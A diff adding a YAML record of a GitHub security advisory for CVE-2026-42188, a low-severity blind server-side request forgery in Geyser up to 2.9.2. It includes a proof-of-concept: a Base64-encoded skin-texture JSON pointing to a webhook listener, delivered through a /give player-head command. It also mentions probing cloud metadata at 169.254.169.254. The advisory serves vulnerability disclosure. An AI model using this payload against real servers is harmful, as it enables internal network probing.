@@ -1,0 +1,91 @@
+advisory_id: GHSA-xcfg-fcr5-gw9r
+datasource_id: github_osv/GHSA-xcfg-fcr5-gw9r
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xcfg-fcr5-gw9r/GHSA-xcfg-fcr5-gw9r.json
+aliases:
+  - CVE-2026-42188
+summary: |
+  Geyser Vulnerable to Server-Side Request Forgery (SSRF) via Player Head Texture URL in Geyser
+  ### Summary
+  A server-side request forgery (SSRF) vulnerability exists in Geyser’s handling of Bedrock player head texture data.
+  By supplying a crafted Base64-encoded skin texture URL via the /give command, an attacker can cause the Minecraft server to issue arbitrary HTTP GET requests to attacker-controlled or internal endpoints.
+  This occurs server-side, without proper URL validation, and can be triggered by a Bedrock client.
+
+  ### Details
+  Geyser allows Bedrock clients to interact with Java Edition mechanics, including the creation of custom player heads using the minecraft:profile NBT structure.
+
+  When a player head is created with a custom textures property, Geyser processes the Base64-encoded JSON value and forwards the embedded texture URL for resolution.
+  However, the URL contained in the textures.SKIN.url field is not sufficiently validated.
+  ### PoC
+
+  1. **Setup Environment:**
+     - Set up a Minecraft Server (Paper/Spigot) with the latest version of Geyser installed.
+     - Ensure you have a Bedrock client connected.
+
+  2. **Prepare Listener:**
+     - Go to [webhook.site](https://webhook.site) and obtain a unique URL (e.g., `https://webhook.site/YOUR-UUID`).
+
+  3. **Construct Payload:**
+     - Create a JSON payload pointing to your listener URL:
+       `{"textures":{"SKIN":{"url":"https://webhook.site/YOUR-UUID"}}}`
+     - Encode this JSON string to Base64.
+       *(You can use a terminal command: `echo -n '{"textures":{"SKIN":{"url":"..."}}}' | base64`)*
+
+  4. **Execute Command:**
+     - Run the following command in the Bedrock Edition client:
+     `/give @p minecraft:player_head[minecraft:profile={properties:[{name:"textures",value:"[PASTE_BASE64_HERE]"}]}]`
+
+  5. **Verify:**
+     - Check the webhook.site dashboard.
+     - You will see an **HTTP GET request originating from the Minecraft Server's IP address**, not the client's IP.
+
+  ### Impact
+  This vulnerability allows server-side request forgery (SSRF) from the Minecraft server to arbitrary HTTP endpoints.
+
+  #### Affected Parties
+  - Minecraft servers running Geyser
+  - Server operators exposing internal or cloud metadata endpoints
+
+  #### Potential Impacts
+  - Internal network probing (e.g., intranet services, admin panels)
+  - Cloud metadata access attempts (e.g., 169.254.169.254)
+  - IP address disclosure of the Minecraft server
+  - Abuse of the server as an HTTP request proxy
+
+  Although the vulnerability is blind SSRF (no response data returned to the attacker), it is still useful for:
+  - Network mapping
+  - Firewall bypass attempts
+  - Cloud environment fingerprinting
+impacted_packages:
+  - purl: pkg:maven/org.geysermc.geyser/core
+    affected_versions: vers:maven/<=2.9.2
+    fixed_versions: vers:maven/2.9.3
+    affected_packages:
+      - pkg:maven/org.geysermc.geyser/core@2.9.2
+    fixed_packages:
+      - pkg:maven/org.geysermc.geyser/core@2.9.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '2.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xcfg-fcr5-gw9r/GHSA-xcfg-fcr5-gw9r.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/GeyserMC/Geyser
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42188
+    reference_type:
+    reference_id: CVE-2026-42188
+  - url: https://github.com/GeyserMC/Geyser/security/advisories/GHSA-xcfg-fcr5-gw9r
+    reference_type:
+    reference_id: GHSA-xcfg-fcr5-gw9r
+exploits: []
